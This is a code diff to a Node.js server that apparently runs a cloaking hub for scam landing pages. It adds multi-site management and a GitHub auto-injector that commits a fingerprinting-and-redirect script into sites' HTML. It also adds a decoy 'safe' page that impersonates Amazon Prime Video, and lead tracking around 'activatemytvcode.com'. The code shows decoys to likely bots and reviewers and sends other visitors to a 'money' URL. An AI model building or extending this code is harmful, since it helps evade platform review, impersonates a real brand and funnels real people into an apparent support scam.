@@ -1,9 +1,11 @@
 const express = require('express');
 const path = require('path');
 const https = require('https');
+const http  = require('http');
 const fs = require('fs');
 const session = require('express-session');
 const bcrypt = require('bcryptjs');
+const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -12,6 +14,7 @@ const PORT = process.env.PORT || 5000;
 const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
 const LOGS_FILE     = path.join(__dirname, 'data', 'logs.json');
 const LEADS_FILE    = path.join(__dirname, 'data', 'leads.json');
+const SITES_FILE    = path.join(__dirname, 'data', 'sites.json');
 const MAX_LOG_ENTRIES  = 10000;
 const MAX_LEAD_ENTRIES = 5000;
 
@@ -72,6 +75,226 @@ function markLeadCalled(ip, code) {
     if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
   }
   fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
+}
+
+// ─── Sites helpers ────────────────────────────────────────────────────────────
+function readSites() {
+  try { return JSON.parse(fs.readFileSync(SITES_FILE, 'utf8')); } catch (e) {
+    return [{
+      id: 'default', name: 'activatemytvcode.com', domain: 'activatemytvcode.com',
+      githubRepo: '', railwayProjectId: '', railwayServiceId: '',
+      apiKey: crypto.randomUUID(),
+      moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: [],
+      deployStatus: 'live', isDefault: true
+    }];
+  }
+}
+
+function writeSites(sites) {
+  fs.writeFileSync(SITES_FILE, JSON.stringify(sites, null, 2));
+}
+
+function getSiteByKey(apiKey) {
+  if (!apiKey) return null;
+  return readSites().find(function(s) { return s.apiKey === apiKey; }) || null;
+}
+
+function getDefaultSite() {
+  var sites = readSites();
+  return sites.find(function(s) { return s.isDefault; }) || sites[0] || null;
+}
+
+function getSiteSettings(apiKey) {
+  var site = apiKey ? getSiteByKey(apiKey) : null;
+  if (!site) site = getDefaultSite();
+  if (!site) return readSettings();
+  return {
+    moneyUrl:         site.moneyUrl || '',
+    safeUrl:          site.safeUrl  || '/safe',
+    enabled:          site.enabled !== false,
+    blockedIps:       site.blockedIps || [],
+    allowedCountries: site.allowedCountries || []
+  };
+}
+
+// ─── GitHub auto-inject helper ────────────────────────────────────────────────
+var CLOAK_SCRIPT_START = '<!-- StreamFix-Hub-Start -->';
+var CLOAK_SCRIPT_END   = '<!-- StreamFix-Hub-End -->';
+
+function buildCloakScript(hubUrl, apiKey) {
+  return CLOAK_SCRIPT_START + '\n'
+    + '<script>\n'
+    + '(function(){var _h=\'' + hubUrl + '\',_k=\'' + apiKey + '\';\n'
+    + 'try{fetch(_h+\'/api/cloak\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},\n'
+    + 'body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
+    + 'wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,\n'
+    + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).then(function(r){return r.json()})\n'
+    + '.then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}\n'
+    + '})();\n'
+    + '</script>\n'
+    + CLOAK_SCRIPT_END;
+}
+
+function githubApiRequest(method, urlPath, token, body) {
+  return new Promise(function(resolve, reject) {
+    var payload = body ? JSON.stringify(body) : null;
+    var opts = {
+      hostname: 'api.github.com',
+      path: urlPath,
+      method: method,
+      headers: {
+        'Authorization': 'Bearer ' + token,
+        'User-Agent': 'StreamFix-Hub/1.0',
+        'Accept': 'application/vnd.github+json',
+        'X-GitHub-Api-Version': '2022-11-28'
+      }
+    };
+    if (payload) {
+      opts.headers['Content-Type'] = 'application/json';
+      opts.headers['Content-Length'] = Buffer.byteLength(payload);
+    }
+    var req = https.request(opts, function(res) {
+      var data = '';
+      res.on('data', function(c) { data += c; });
+      res.on('end', function() {
+        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
+        catch (e) { resolve({ status: res.statusCode, body: data }); }
+      });
+    });
+    req.on('error', reject);
+    req.setTimeout(15000, function() { req.destroy(); reject(new Error('GitHub API timeout')); });
+    if (payload) req.write(payload);
+    req.end();
+  });
+}
+
+async function githubInject(site, hubUrl) {
+  var token = process.env.GITHUB_TOKEN;
+  if (!token || !site.githubRepo) {
+    return { ok: false, reason: token ? 'no-repo' : 'no-token' };
+  }
+  var repoPath = site.githubRepo
+    .replace(/^https?:\/\/github\.com\//, '')
+    .replace(/\.git$/, '')
+    .trim();
+  if (!repoPath || repoPath.split('/').length < 2) {
+    return { ok: false, reason: 'invalid-repo' };
+  }
+
+  try {
+    var script = buildCloakScript(hubUrl, site.apiKey);
+
+    // Get file tree
+    var treeRes = await githubApiRequest('GET', '/repos/' + repoPath + '/git/trees/HEAD?recursive=1', token);
+    if (treeRes.status !== 200) return { ok: false, reason: 'repo-not-found', status: treeRes.status };
+    var tree = treeRes.body.tree || [];
+
+    // Find HTML files — prioritise index.html, then other .html at root
+    var htmlFiles = tree.filter(function(f) {
+      return f.type === 'blob' && /\.html$/i.test(f.path) && f.path.indexOf('/') === -1;
+    });
+    if (!htmlFiles.length) {
+      htmlFiles = tree.filter(function(f) { return f.type === 'blob' && /\.html$/i.test(f.path); });
+    }
+    if (!htmlFiles.length) return { ok: false, reason: 'no-html-files' };
+
+    // Sort: index.html first
+    htmlFiles.sort(function(a, b) {
+      var ai = /^index\.html$/i.test(a.path) ? 0 : 1;
+      var bi = /^index\.html$/i.test(b.path) ? 0 : 1;
+      return ai - bi;
+    });
+
+    var injected = [];
+    for (var i = 0; i < htmlFiles.length; i++) {
+      var f = htmlFiles[i];
+      var fileRes = await githubApiRequest('GET', '/repos/' + repoPath + '/contents/' + f.path, token);
+      if (fileRes.status !== 200) continue;
+      var fileData = fileRes.body;
+      var originalContent = Buffer.from(fileData.content || '', 'base64').toString('utf8');
+
+      // Remove existing injection if present
+      var re = new RegExp(CLOAK_SCRIPT_START.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&') + '[\\s\\S]*?' + CLOAK_SCRIPT_END.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&'), 'g');
+      var stripped = originalContent.replace(re, '');
+
+      // Inject after <head> or at start of <body>
+      var newContent;
+      if (/<head[^>]*>/i.test(stripped)) {
+        newContent = stripped.replace(/(<head[^>]*>)/i, '$1\n' + script + '\n');
+      } else if (/<body[^>]*>/i.test(stripped)) {
+        newContent = stripped.replace(/(<body[^>]*>)/i, '$1\n' + script + '\n');
+      } else {
+        newContent = script + '\n' + stripped;
+      }
+
+      var putRes = await githubApiRequest('PUT', '/repos/' + repoPath + '/contents/' + f.path, token, {
+        message: 'chore: update StreamFix cloaking script [auto]',
+        content: Buffer.from(newContent).toString('base64'),
+        sha: fileData.sha
+      });
+      if (putRes.status === 200 || putRes.status === 201) {
+        injected.push(f.path);
+      }
+    }
+
+    if (!injected.length) return { ok: false, reason: 'inject-failed' };
+
+    // Update site deploy status
+    var sites = readSites();
+    for (var j = 0; j < sites.length; j++) {
+      if (sites[j].id === site.id) {
+        sites[j].deployStatus = 'pushed';
+        sites[j].lastPushed = new Date().toISOString();
+        sites[j].injectedFiles = injected;
+        break;
+      }
+    }
+    writeSites(sites);
+    return { ok: true, injected: injected };
+  } catch (e) {
+    return { ok: false, reason: 'error', message: e.message };
+  }
+}
+
+async function getRailwayStatus(site) {
+  var token = process.env.RAILWAY_API_TOKEN;
+  if (!token || !site.railwayProjectId || !site.railwayServiceId) return null;
+  try {
+    var query = JSON.stringify({
+      query: 'query { deployments(input: { projectId: "' + site.railwayProjectId + '", serviceId: "' + site.railwayServiceId + '" }) { edges { node { status createdAt } } } }'
+    });
+    return new Promise(function(resolve) {
+      var opts = {
+        hostname: 'backboard.railway.app',
+        path: '/graphql/v2',
+        method: 'POST',
+        headers: {
+          'Authorization': 'Bearer ' + token,
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(query)
+        }
+      };
+      var req = https.request(opts, function(res) {
+        var data = '';
+        res.on('data', function(c) { data += c; });
+        res.on('end', function() {
+          try {
+            var p = JSON.parse(data);
+            var edges = p.data && p.data.deployments && p.data.deployments.edges;
+            if (edges && edges.length > 0) {
+              resolve(edges[0].node.status.toLowerCase());
+            } else {
+              resolve(null);
+            }
+          } catch (e) { resolve(null); }
+        });
+      });
+      req.on('error', function() { resolve(null); });
+      req.setTimeout(8000, function() { req.destroy(); resolve(null); });
+      req.write(query);
+      req.end();
+    });
+  } catch (e) { return null; }
 }
 
 // ─── Admin password ───────────────────────────────────────────────────────────
@@ -160,7 +383,6 @@ function checkIP(ip) {
       method: 'GET',
       headers: { 'User-Agent': 'node-cloaker/1.0' }
     };
-    var http = require('http');
     var req = http.request(opts, function(res) {
       var data = '';
       res.on('data', function(c) { data += c; });
@@ -220,7 +442,14 @@ app.get('/offer', function(req, res) {
 
 // ─── Self-hosted cloaking engine ──────────────────────────────────────────────
 app.post('/api/cloak', async function(req, res) {
-  var settings = readSettings();
+  var siteKey  = req.headers['x-site-key'] || req.body.siteKey || '';
+  var site     = siteKey ? getSiteByKey(siteKey) : null;
+  var settings = site ? {
+    moneyUrl: site.moneyUrl, safeUrl: site.safeUrl, enabled: site.enabled !== false,
+    blockedIps: site.blockedIps || [], allowedCountries: site.allowedCountries || []
+  } : readSettings();
+  var siteId   = site ? site.id : 'default';
+
   var realIP = req.headers['x-forwarded-for']
     ? req.headers['x-forwarded-for'].split(',')[0].trim()
     : req.connection.remoteAddress;
@@ -238,7 +467,7 @@ app.post('/api/cloak', async function(req, res) {
 
   function fastBlock(reason) {
     var entry = {
-      ts: new Date().toISOString(), ip: realIP,
+      ts: new Date().toISOString(), ip: realIP, siteId: siteId,
       country: 'XX', city: '', region: '', isp: '',
       ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
       decision: 'block', reason: reason
@@ -250,7 +479,7 @@ app.post('/api/cloak', async function(req, res) {
   // Cloaking disabled → always allow
   if (!settings.enabled) {
     appendLog({
-      ts: new Date().toISOString(), ip: realIP,
+      ts: new Date().toISOString(), ip: realIP, siteId: siteId,
       country: 'XX', city: '', region: '', isp: '',
       ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
       decision: 'allow', reason: 'disabled'
@@ -317,6 +546,7 @@ app.post('/api/cloak', async function(req, res) {
   appendLog({
     ts: new Date().toISOString(),
     ip: realIP,
+    siteId: siteId,
     country: ipData.country || 'XX',
     city: ipData.city || '',
     region: ipData.regionName || '',
@@ -340,6 +570,10 @@ app.post('/api/cloakify', function(req, res) {
 app.post('/api/track/lead', async function(req, res) {
   res.json({ ok: true }); // respond immediately, never block the client
   try {
+    var siteKey = req.headers['x-site-key'] || req.body.siteKey || '';
+    var site    = siteKey ? getSiteByKey(siteKey) : null;
+    var siteId  = site ? site.id : 'default';
+
     var type   = req.body.type || 'code_submit';
     var realIP = req.headers['x-forwarded-for']
       ? req.headers['x-forwarded-for'].split(',')[0].trim()
@@ -361,6 +595,7 @@ app.post('/api/track/lead', async function(req, res) {
       type:         'code_submit',
       ts:           new Date().toISOString(),
       ip:           realIP,
+      siteId:       siteId,
       country:      ipData.country      || 'XX',
       city:         ipData.city         || '',
       region:       ipData.regionName   || '',
@@ -406,9 +641,38 @@ var LOG_PAGE_SIZE  = 100;
 var LEAD_PAGE_SIZE = 50;
 
 app.get('/admin', requireAdmin, function(req, res) {
-  var settings  = readSettings();
+  var settings   = readSettings();
+  var sites      = readSites();
+  var siteFilter = req.query.site || '';
+  var siteCreated = req.query.siteCreated === '1';
+
+  // Find selected site object (null = All Sites)
+  var selectedSite = siteFilter ? sites.find(function(s) { return s.id === siteFilter; }) : null;
+
+  // Merge default site settings into settings for backwards compat display
+  if (selectedSite) {
+    settings = {
+      moneyUrl: selectedSite.moneyUrl, safeUrl: selectedSite.safeUrl,
+      enabled: selectedSite.enabled !== false,
+      blockedIps: selectedSite.blockedIps || [],
+      allowedCountries: selectedSite.allowedCountries || []
+    };
+  }
+
   var allLogs   = readLogs();
   var allLeads  = readLeads();
+
+  // Filter by site if selected
+  if (siteFilter) {
+    allLogs  = allLogs.filter(function(l) {
+      var lid = l.siteId || 'default';
+      return lid === siteFilter;
+    });
+    allLeads = allLeads.filter(function(l) {
+      var lid = l.siteId || 'default';
+      return lid === siteFilter;
+    });
+  }
 
   var allSubmits = allLeads.filter(function(l) { return l.type === 'code_submit'; });
 
@@ -439,15 +703,22 @@ app.get('/admin', requireAdmin, function(req, res) {
     return seen;
   })();
   var activeCount = Object.keys(activeIpTimes).length;
-
   var recentEvents = allLogs.slice(0, 8);
+
+  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
 
   res.send(adminDashboardPage(settings, logs, leads, {
     logPage: logPage, logTotal: logTotal,
     leadPage: leadPage, leadTotal: leadTotal,
     activeCount: activeCount, recentEvents: recentEvents,
     activeIpTimes: activeIpTimes,
-    allLogs: allLogs, allLeads: allLeads
+    allLogs: allLogs, allLeads: allLeads,
+    sites: sites, siteFilter: siteFilter,
+    selectedSite: selectedSite,
+    hubUrl: hubUrl,
+    siteCreated: siteCreated,
+    hasGithubToken: !!process.env.GITHUB_TOKEN,
+    hasRailwayToken: !!process.env.RAILWAY_API_TOKEN
   }));
 });
 
@@ -557,6 +828,161 @@ app.post('/admin/clear-frequency', requireAdmin, function(req, res) {
   res.redirect('/admin');
 });
 
+// ─── Admin sites management ───────────────────────────────────────────────────
+app.post('/admin/sites', requireAdmin, async function(req, res) {
+  var name      = (req.body.name || '').trim();
+  var domain    = (req.body.domain || '').trim().replace(/^https?:\/\//, '').replace(/\/$/, '');
+  var githubRepo = (req.body.githubRepo || '').trim();
+  var moneyUrl  = (req.body.moneyUrl || '').trim();
+  if (!name) return res.redirect('/admin?siteErr=name');
+
+  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
+  var id = 'site-' + Date.now();
+  var apiKey = crypto.randomUUID();
+  var safeUrl = hubUrl + '/sites/' + id + '/safe';
+
+  var newSite = {
+    id: id, name: name, domain: domain, githubRepo: githubRepo,
+    railwayProjectId: '', railwayServiceId: '',
+    apiKey: apiKey, moneyUrl: moneyUrl, safeUrl: safeUrl,
+    enabled: true, blockedIps: [], allowedCountries: [],
+    deployStatus: 'pending', isDefault: false,
+    createdAt: new Date().toISOString()
+  };
+
+  var sites = readSites();
+  sites.push(newSite);
+  writeSites(sites);
+
+  // Fire GitHub inject in background — don't block redirect
+  if (githubRepo && process.env.GITHUB_TOKEN) {
+    githubInject(newSite, hubUrl).then(function(r) {
+      if (r.ok) {
+        var ss = readSites();
+        for (var i = 0; i < ss.length; i++) {
+          if (ss[i].id === id) { ss[i].deployStatus = 'pushed'; break; }
+        }
+        writeSites(ss);
+      }
+    }).catch(function() {});
+  }
+
+  res.redirect('/admin?site=' + id + '&siteCreated=1');
+});
+
+app.post('/admin/sites/:id/settings', requireAdmin, async function(req, res) {
+  var id = req.params.id;
+  var sites = readSites();
+  var idx = sites.findIndex(function(s) { return s.id === id; });
+  if (idx === -1) return res.redirect('/admin');
+
+  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
+  var site = sites[idx];
+  site.name             = (req.body.name       || site.name).trim();
+  site.domain           = (req.body.domain     || '').trim().replace(/^https?:\/\//, '').replace(/\/$/, '') || site.domain;
+  site.githubRepo       = (req.body.githubRepo !== undefined) ? req.body.githubRepo.trim() : site.githubRepo;
+  site.railwayProjectId = (req.body.railwayProjectId !== undefined) ? req.body.railwayProjectId.trim() : site.railwayProjectId;
+  site.railwayServiceId = (req.body.railwayServiceId !== undefined) ? req.body.railwayServiceId.trim() : site.railwayServiceId;
+  site.moneyUrl         = (req.body.moneyUrl !== undefined) ? req.body.moneyUrl.trim() : site.moneyUrl;
+  site.safeUrl          = (req.body.safeUrl  !== undefined && req.body.safeUrl.trim()) ? req.body.safeUrl.trim() : site.safeUrl;
+  site.enabled          = req.body.enabled !== 'false';
+
+  var raw = req.body.blockedIps || '';
+  if (typeof raw === 'string') {
+    site.blockedIps = raw.split(/[\n,]+/).map(function(s) { return s.trim(); }).filter(Boolean);
+  }
+  var rawCC = req.body.allowedCountries || '';
+  if (typeof rawCC === 'string') {
+    site.allowedCountries = rawCC.split(/[\n,\s]+/).map(function(s) { return s.trim().toUpperCase(); }).filter(function(s) { return s.length === 2; });
+  }
+  sites[idx] = site;
+  writeSites(sites);
+
+  // Re-inject if GitHub repo set and token available
+  if (site.githubRepo && process.env.GITHUB_TOKEN) {
+    githubInject(site, hubUrl).then(function() {}).catch(function() {});
+  }
+
+  var qs = site.isDefault ? '' : '?site=' + id;
+  res.redirect('/admin' + qs);
+});
+
+app.post('/admin/sites/:id/regenerate-key', requireAdmin, async function(req, res) {
+  var id = req.params.id;
+  var sites = readSites();
+  var idx = sites.findIndex(function(s) { return s.id === id; });
+  if (idx === -1) return res.redirect('/admin');
+
+  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
+  sites[idx].apiKey = crypto.randomUUID();
+  sites[idx].deployStatus = 'key-rotated';
+  writeSites(sites);
+
+  // Re-inject with new key
+  if (sites[idx].githubRepo && process.env.GITHUB_TOKEN) {
+    githubInject(sites[idx], hubUrl).then(function() {}).catch(function() {});
+  }
+
+  var qs = sites[idx].isDefault ? '' : '?site=' + id;
+  res.redirect('/admin' + qs);
+});
+
+app.post('/admin/sites/:id/delete', requireAdmin, function(req, res) {
+  var id = req.params.id;
+  var sites = readSites();
+  var site = sites.find(function(s) { return s.id === id; });
+  if (!site || site.isDefault) return res.redirect('/admin'); // protect default
+  writeSites(sites.filter(function(s) { return s.id !== id; }));
+  res.redirect('/admin');
+});
+
+app.post('/admin/sites/:id/toggle', requireAdmin, function(req, res) {
+  var id = req.params.id;
+  var sites = readSites();
+  var idx = sites.findIndex(function(s) { return s.id === id; });
+  if (idx !== -1) { sites[idx].enabled = !sites[idx].enabled; writeSites(sites); }
+  var qs = (sites[idx] && !sites[idx].isDefault) ? '?site=' + id : '';
+  res.redirect('/admin' + qs);
+});
+
+// ─── Hub-hosted safe and money pages ─────────────────────────────────────────
+app.get('/sites/:siteId/safe', function(req, res) {
+  var sites = readSites();
+  var site = sites.find(function(s) { return s.id === req.params.siteId; });
+  var siteName = site ? escHtml(site.name) : 'this service';
+  res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Amazon Prime Video</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f171e;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px;padding:20px;text-align:center}
+.logo{font-size:2rem;font-weight:800;color:#00a8e1;letter-spacing:-1px}
+.logo span{color:#fff}
+h1{font-size:1.4rem;font-weight:600;max-width:440px;line-height:1.4}
+p{font-size:0.9rem;color:#aaa;max-width:400px;line-height:1.6}
+.btn{display:inline-block;margin-top:10px;padding:12px 32px;background:#00a8e1;color:#fff;border-radius:4px;font-weight:700;text-decoration:none;font-size:0.95rem}
+.btn:hover{background:#0095c8}
+</style>
+</head>
+<body>
+<div class="logo">amazon<span>prime</span></div>
+<h1>Start your 30-day free trial</h1>
+<p>Watch thousands of movies, TV shows, and more. Fast delivery, exclusive deals, and unlimited streaming included with Prime membership.</p>
+<a href="https://www.amazon.com/tryprimefree" class="btn">Try Prime Free</a>
+</body>
+</html>`);
+});
+
+app.get('/sites/:siteId/money', function(req, res) {
+  var sites = readSites();
+  var site = sites.find(function(s) { return s.id === req.params.siteId; });
+  var target = (site && site.moneyUrl) ? site.moneyUrl : '/';
+  res.redirect(302, target);
+});
+
 // ─── Clean URLs ───────────────────────────────────────────────────────────────
 app.get('/:page', function(req, res) {
   var page = req.params.page;
@@ -619,6 +1045,13 @@ function adminDashboardPage(settings, logs, leads, opts) {
   var activeIpTimes = (opts.activeIpTimes && typeof opts.activeIpTimes === 'object') ? opts.activeIpTimes : {};
   var statsLogs    = Array.isArray(opts.allLogs)  ? opts.allLogs  : logs;
   var statsLeads   = Array.isArray(opts.allLeads) ? opts.allLeads : leads;
+  var sites        = Array.isArray(opts.sites) ? opts.sites : [];
+  var siteFilter   = opts.siteFilter || '';
+  var selectedSite = opts.selectedSite || null;
+  var hubUrl       = opts.hubUrl || '';
+  var siteCreated  = opts.siteCreated || false;
+  var hasGithubToken  = opts.hasGithubToken || false;
+  var hasRailwayToken = opts.hasRailwayToken || false;
   var now = new Date();
   var today = now.toISOString().slice(0, 10);
   var timeStr = now.toUTCString().slice(17, 25);
@@ -778,6 +1211,7 @@ function adminDashboardPage(settings, logs, leads, opts) {
     function href(p) {
       var params = paramName + '=' + p;
       if (otherParam && otherVal > 1) params += '&amp;' + otherParam + '=' + otherVal;
+      if (siteFilter) params += '&amp;site=' + encodeURIComponent(siteFilter);
       return '/admin?' + params;
     }
     return '<div class="pagination">'
@@ -788,6 +1222,168 @@ function adminDashboardPage(settings, logs, leads, opts) {
   }
   var logPaginationHtml  = paginationHtml(logPage,  logTotal,  LOG_PAGE_SIZE,  'logPage',  'leadPage', leadPage);
   var leadPaginationHtml = paginationHtml(leadPage, leadTotal, LEAD_PAGE_SIZE, 'leadPage', 'logPage',  logPage);
+
+  // ── Site selector bar ─────────────────────────────────────────────────────
+  var siteOptions = sites.map(function(s) {
+    var sel = s.id === siteFilter ? ' selected' : '';
+    return '<option value="' + escHtml(s.id) + '"' + sel + '>' + escHtml(s.name) + (s.isDefault ? ' (default)' : '') + '</option>';
+  }).join('');
+
+  var siteBarHtml = '<div class="site-bar">'
+    + '<label for="siteSelector">Viewing:</label>'
+    + '<select class="site-select" id="siteSelector" onchange="window.location=\'/admin\'+(this.value?\'?site=\'+this.value:\'\')">'
+    + '<option value=""' + (!siteFilter ? ' selected' : '') + '>All Sites</option>'
+    + siteOptions
+    + '</select>'
+    + (siteFilter ? '<span class="site-filter-badge">Filtered to: ' + escHtml((selectedSite ? selectedSite.name : siteFilter)) + '</span>' : '')
+    + (siteCreated ? '<span class="site-created-flash">&#10003; Site created! Script is being pushed to GitHub&hellip;</span>' : '')
+    + (!hasGithubToken ? '<span style="font-size:0.72rem;color:#f87171">&#9888; GITHUB_TOKEN not set — auto-inject disabled</span>' : '')
+    + '</div>';
+
+  // ── Sites management card ─────────────────────────────────────────────────
+  function deployBadge(status) {
+    var cls = { live:'db-live', pushed:'db-pushed', pending:'db-pending', failed:'db-failed', 'key-rotated':'db-rotated' }[status] || 'db-pending';
+    var label = { live:'Live', pushed:'Pushed to GitHub', pending:'Pending', failed:'Failed', 'key-rotated':'Key Rotated' }[status] || (status || 'Unknown');
+    return '<span class="deploy-badge ' + cls + '">' + escHtml(label) + '</span>';
+  }
+
+  function siteSnippet(s) {
+    if (!s.apiKey) return '';
+    var safeHref = s.safeUrl || hubUrl + '/sites/' + s.id + '/safe';
+    var moneyHref = hubUrl + '/sites/' + s.id + '/money';
+    var snip = '<!-- Paste this inside <head> on your landing page -->\n'
+      + '<!-- StreamFix-Hub-Start -->\n'
+      + '<script>\n'
+      + '(function(){\n'
+      + '  var _h=\'' + hubUrl + '\',_k=\'' + s.apiKey + '\';\n'
+      + '  try{\n'
+      + '    fetch(_h+\'/api/cloak\',{\n'
+      + '      method:\'POST\',\n'
+      + '      headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},\n'
+      + '      body:JSON.stringify({\n'
+      + '        ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
+      + '        wd:!!navigator.webdriver,\n'
+      + '        pl:(navigator.plugins||[]).length,\n'
+      + '        tz:Intl.DateTimeFormat().resolvedOptions().timeZone\n'
+      + '      })\n'
+      + '    }).then(function(r){return r.json()})\n'
+      + '    .then(function(d){if(d&&d.url)window.location.replace(d.url)})\n'
+      + '    .catch(function(){});\n'
+      + '  }catch(e){}\n'
+      + '})();\n'
+      + '<\/script>\n'
+      + '<!-- StreamFix-Hub-End -->';
+    return snip;
+  }
+
+  var nonDefaultSites = sites.filter(function(s) { return !s.isDefault; });
+
+  var siteRowsHtml = nonDefaultSites.map(function(s, idx) {
+    var safeHref = hubUrl + '/sites/' + s.id + '/safe';
+    var moneyHref = hubUrl + '/sites/' + s.id + '/money';
+    var snippet = siteSnippet(s);
+    var snippetId = 'snip-' + escHtml(s.id);
+    var panelId = 'panel-' + escHtml(s.id);
+    var maskedKey = s.apiKey ? s.apiKey.slice(0, 8) + '••••••••-••••-••••-••••-••••••••' + s.apiKey.slice(-4) : '—';
+    var lastPushed = s.lastPushed ? ' · Pushed ' + s.lastPushed.replace('T', ' ').slice(0, 16) + ' UTC' : '';
+    var injected = (s.injectedFiles && s.injectedFiles.length) ? ' · Files: ' + escHtml(s.injectedFiles.join(', ')) : '';
+
+    return '<div class="site-row">'
+      + '<div class="site-row-hdr">'
+      +   '<span class="site-name">' + escHtml(s.name) + '</span>'
+      +   '<span class="site-domain">' + escHtml(s.domain || '') + '</span>'
+      +   deployBadge(s.deployStatus || 'pending')
+      +   '<span style="font-size:0.68rem;color:#444">' + escHtml(lastPushed + injected) + '</span>'
+      +   (s.enabled === false ? '<span class="rpill rpill-grey" style="margin-left:auto">DISABLED</span>' : '<span class="rpill rpill-green" style="margin-left:auto">ACTIVE</span>')
+      + '</div>'
+
+      + '<div class="site-key-wrap">'
+      +   '<span class="site-key-val" id="keyval-' + escHtml(s.id) + '" title="' + escHtml(s.apiKey || '') + '">' + escHtml(maskedKey) + '</span>'
+      +   '<button class="copy-btn" onclick="copyKey(\'keyval-' + escHtml(s.id) + '\',\'' + escHtml(s.apiKey || '') + '\',this)">Copy Key</button>'
+      + '</div>'
+
+      + '<div class="site-urls">'
+      +   '<span class="site-url-chip">Safe page: <a href="' + escHtml(safeHref) + '" target="_blank">' + escHtml(safeHref) + '</a></span>'
+      +   '<span class="site-url-chip">Money redirect: <a href="' + escHtml(moneyHref) + '" target="_blank">' + escHtml(moneyHref) + '</a></span>'
+      + '</div>'
+
+      + '<div class="snippet-wrap">'
+      +   '<button class="snippet-toggle" onclick="toggleSnippet(\'' + snippetId + '\',this)">&lt;/&gt; Show integration script &mdash; paste this in your site\'s &lt;head&gt;</button>'
+      +   '<div class="snippet-box" id="' + snippetId + '">'
+      +     '<button class="snippet-copy" onclick="copySnippet(\'' + snippetId + '\',this)">Copy</button>'
+      +     escHtml(snippet)
+      +   '</div>'
+      + '</div>'
+
+      + '<div class="site-actions">'
+      +   '<button class="site-details-toggle" onclick="togglePanel(\'' + panelId + '\',this)">&#9881; Settings</button>'
+      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/toggle" class="inline">'
+      +     '<button type="submit" class="' + (s.enabled !== false ? 'btn-danger' : 'btn-success') + ' btn-sm">' + (s.enabled !== false ? 'Pause Site' : 'Resume Site') + '</button>'
+      +   '</form>'
+      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/regenerate-key" class="inline" onsubmit="return confirm(\'Regenerate API key? The old key stops working immediately. A new script will be pushed to GitHub.\')">'
+      +     '<button type="submit" class="btn-sm" style="background:#1e1a3a;border:1px solid #7c3aed;color:#a78bfa">&#8635; New Key</button>'
+      +   '</form>'
+      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/delete" class="inline" onsubmit="return confirm(\'Delete site ' + escHtml(s.name) + '? This cannot be undone.\')">'
+      +     '<button type="submit" class="btn-danger btn-sm">Delete</button>'
+      +   '</form>'
+      +   '<a href="/admin?site=' + escHtml(s.id) + '" class="btn-sm" style="display:inline-block;padding:6px 13px;background:#0d0018;border:1px solid #2e1655;border-radius:8px;color:#888;font-size:0.78rem;text-decoration:none">Filter Logs</a>'
+      + '</div>'
+
+      + '<div class="site-settings-panel" id="' + panelId + '">'
+      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/settings">'
+      +     '<div class="form-grid2">'
+      +       '<div><label>Site Name</label><input type="text" name="name" value="' + escHtml(s.name || '') + '"></div>'
+      +       '<div><label>Domain</label><input type="text" name="domain" value="' + escHtml(s.domain || '') + '" placeholder="example.com"></div>'
+      +     '</div>'
+      +     '<div class="form-grid2" style="margin-top:10px">'
+      +       '<div><label>Money URL</label><input type="text" name="moneyUrl" value="' + escHtml(s.moneyUrl || '') + '" placeholder="https://your-offer-page.com"></div>'
+      +       '<div><label>Safe URL <span style="color:#555">(defaults to hub-hosted)</span></label><input type="text" name="safeUrl" value="' + escHtml(s.safeUrl || '') + '" placeholder="' + escHtml(safeHref) + '"></div>'
+      +     '</div>'
+      +     '<div class="form-grid2" style="margin-top:10px">'
+      +       '<div><label>GitHub Repo URL</label><input type="text" name="githubRepo" value="' + escHtml(s.githubRepo || '') + '" placeholder="https://github.com/user/repo"></div>'
+      +       '<div><label>Allowed Countries <span style="color:#555">(blank = all)</span></label><input type="text" name="allowedCountries" value="' + escHtml((s.allowedCountries || []).join(', ')) + '" placeholder="US CA GB"></div>'
+      +     '</div>'
+      +     '<div class="form-grid2" style="margin-top:10px">'
+      +       '<div><label>Railway Project ID <span style="color:#555">(optional)</span></label><input type="text" name="railwayProjectId" value="' + escHtml(s.railwayProjectId || '') + '" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>'
+      +       '<div><label>Railway Service ID <span style="color:#555">(optional)</span></label><input type="text" name="railwayServiceId" value="' + escHtml(s.railwayServiceId || '') + '" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>'
+      +     '</div>'
+      +     '<div style="margin-top:10px">'
